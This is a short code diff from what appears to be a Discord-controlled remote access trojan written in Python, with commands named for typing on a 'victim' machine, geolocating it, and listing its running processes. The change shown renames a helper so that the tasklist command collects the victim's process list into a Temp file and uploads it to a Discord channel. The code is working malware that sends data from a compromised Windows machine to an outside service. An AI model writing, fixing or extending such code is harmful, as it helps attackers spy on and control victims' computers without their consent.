@@ -121,7 +121,7 @@ def victimtype(toPress: str):
 	return f"Wrote `{wrote}`"
 
 
-def tasklist():
+def getTasklist():
 	t = os.popen("tasklist").read()
 	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\tasklist.txt", "w") as f:
 		f.write(t)
@@ -217,7 +217,7 @@ async def typing(interaction: discord.Interaction, message: str):
                   description="list all running processes")
 async def tasklist(interaction: discord.Interaction):
 	await interaction.response.send_message(f"listing all tasks...")
-	await interaction.channel.send(file=discord.File(tasklist()))
+	await interaction.channel.send(file=discord.File(getTasklist()))
 
 
 @bot.tree.command(name="geolocate",
